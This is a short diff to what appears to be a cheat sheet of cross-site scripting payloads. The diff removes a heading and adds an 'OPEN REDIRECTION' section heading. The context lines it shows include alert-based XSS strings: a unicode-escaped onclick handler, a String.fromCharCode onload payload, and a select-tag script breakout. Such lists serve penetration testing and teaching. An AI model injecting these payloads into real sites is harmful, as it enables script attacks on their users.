@@ -1,7 +1,6 @@
 # XSS Payload
 
 
-### h1
 ```
 <h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>
 
@@ -171,3 +170,7 @@ IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 
 '></select><script>alert(1770)</script>
 
+
+
+'''
+# OPEN REDIRECTION
